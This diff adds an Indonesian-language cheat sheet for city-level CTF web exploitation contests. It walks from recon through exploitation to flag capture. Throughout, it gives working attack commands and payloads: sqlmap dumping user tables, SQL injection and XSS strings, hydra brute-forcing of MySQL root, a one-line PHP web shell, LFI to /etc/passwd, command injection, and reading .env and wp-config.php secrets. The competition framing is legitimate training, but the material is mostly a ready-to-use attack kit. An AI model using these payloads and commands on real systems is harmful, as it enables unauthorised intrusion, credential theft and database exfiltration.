@@ -1,0 +1,146 @@
+PLAYBOOK CTF WEB EXPLOITATION – TINGKAT KOTA (VERSI RINGKAS)
+
+Tujuan: Recon → Enumeration → Exploitation → Post Exploitation → Flag
+
+================================================================================
+PHASE 1: RECONNAISSANCE
+================================================================================
+
+1. Basic Info
+   whatweb https://target.com
+   curl -I https://target.com
+   curl https://target.com/robots.txt
+   curl https://target.com/sitemap.xml
+
+2. DNS Enumeration
+   dig target.com ANY
+   dig target.com TXT
+   dig target.com MX
+   dig target.com +trace
+
+3. Subdomain
+   subfinder -d target.com -o subdomains.txt
+
+4. Email (Opsional)
+   theHarvester -d target.com -b all
+
+================================================================================
+PHASE 2: SCANNING & ENUMERATION
+================================================================================
+
+# Nmap Dasar
+nmap -sC -sV -Pn -oN nmap.txt target.com
+nmap -sV -Pn --script vuln target_ip
+
+# MySQL Check (Port 3306)
+nmap --script mysql-info,mysql-empty-password -p 3306 target_ip
+
+================================================================================
+PHASE 3: WEB ENUMERATION
+================================================================================
+
+# Directory Brute Force
+dirsearch -u https://target.com -e php,txt,env,bak,old,conf,sql,zip,backup -t 50
+
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -t 80
+
+# File Sensitif yang Harus Dicek
+.env
+config.php
+wp-config.php
+database.php
+phpmyadmin/
+admin/
+.git/HEAD
+backup.sql
+
+================================================================================
+PHASE 4: EXPLOITATION (Paling Penting)
+================================================================================
+
+4.1 SQL INJECTION
+   sqlmap -u "https://target.com/page.php?id=1" --batch --dbs --risk 3 --level 5
+
+   Lanjutan:
+   sqlmap ... --tables -D db_name
+   sqlmap ... --dump -D db_name -T users
+
+   Manual Test:
+   ' OR 1=1 --
+   ' UNION SELECT 1,2,3 --
+
+4.2 XSS (Cross Site Scripting)
+   Payload Dasar:
+   <script>alert('XSS')</script>
+   <img src=x onerror=alert('XSS')>
+   "><script>alert('XSS')</script>
+
+   Test di form search, komentar, login, dll.
+   Kalau muncul alert box = berhasil.
+
+4.3 MySQL Brute Force (Port 3306 Open)
+   echo -e "root\nadmin\nmysql\npma" > users.txt
+   hydra -L users.txt -P fasttrack.txt mysql://target_ip -t 16
+   hydra -l root -P rockyou.txt mysql://target_ip -t 16
+
+   Login: mysql -h target_ip -u root -p
+
+4.4 Teknik Lain yang Sering Muncul
+   - File Upload → Upload shell.php : <?php system($_GET['cmd']); ?>
+   - LFI → ?page=../../../etc/passwd
+   - Command Injection → ; whoami   atau   && id
+   - IDOR → Ubah angka ID di URL (id=1 → id=2)
+
+================================================================================
+PHASE 5: POST EXPLOITATION
+================================================================================
+
+# Upgrade Shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Cari Flag
+find / -name "flag*" 2>/dev/null
+find / -name "*flag*" 2>/dev/null
+cat /var/www/html/.env
+cat wp-config.php
+
+# Cek Sistem
+whoami && id && uname -a
+
+================================================================================
+URUTAN KERJA TERBAIK (Rekomendasi)
+================================================================================
+
+1. Recon (Phase 1)
+2. Nmap Scanning (Phase 2)
+3. Directory Brute + Cek .env & phpmyadmin (Phase 3)
+4. SQL Injection (sqlmap) ← Prioritas Utama
+5. XSS Testing + Manual Test
+6. MySQL Brute Force (jika port 3306 open)
+7. File Upload / LFI / Command Injection
+8. Post Exploitation & Ambil Flag
+
+================================================================================
+TIPS LOMBA
+================================================================================
+
+- Kerjakan secara berurutan
+- Kalau stuck di satu teknik → langsung ganti
+- Selalu simpan hasil: command > hasil.txt
+- Prioritas: SQLi > Directory Brute > MySQL > File Upload
+- Siapkan wordlist users.txt & shell.php sebelum lomba
+- Tetap tenang & sistematis
+
+═══════════════════════════════════════════════════════════════════════════════
+CATATAN CEPAT SAAT LOMBA
+═══════════════════════════════════════════════════════════════════════════════
+
+Target IP     : 
+Domain        : 
+Port Open     : 
+Teknologi     : 
+
+Flag 1 : 
+Flag 2 : 
+Flag 3 : 
+
